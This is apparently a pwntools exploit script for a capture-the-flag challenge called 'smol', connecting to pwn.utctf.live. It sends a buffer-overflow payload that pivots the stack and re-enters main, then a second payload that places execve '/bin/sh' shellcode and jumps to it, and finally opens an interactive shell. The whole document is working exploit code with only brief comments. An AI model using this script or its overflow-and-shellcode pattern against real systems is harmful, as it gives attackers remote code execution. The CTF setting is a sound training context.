#!/usr/bin/env python3

from pwn import *

#p = process("./smol")
p = remote('pwn.utctf.live', 9998)

shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

main = 0x0040100d
stack = 0x402500



context.terminal = ['tmux', 'splitw', '-h']

#gdb.attach(p, '''
#b*0x40101e
#''')



payload1 = b''
payload1 += b'A' * 0x8 #padding
payload1 += p64(stack) #rbp
payload1 += p64(main + 8) #rip
payload1 += b'B' * (0x200 - 0x8 * 3)

p.send(payload1)



payload2 = b''
payload2 += b'C' * 0x8 #padding
payload2 += b'D' * 0x8 #rbp
payload2 += p64(stack+0x10) #rip
payload2 += shellcode

p.send(payload2)



p.interactive()

